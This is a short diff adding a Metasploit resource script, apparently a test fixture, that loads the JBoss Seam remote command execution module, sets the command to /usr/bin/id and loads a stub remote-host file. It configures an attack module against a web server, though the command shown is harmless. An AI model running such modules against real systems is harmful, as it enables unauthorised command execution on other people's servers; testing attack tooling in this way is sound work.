@@ -1,0 +1,3 @@
+use auxiliary/admin/http/jboss_seam_exec
+set CMD /usr/bin/id
+resource stub_http_rhost.rb
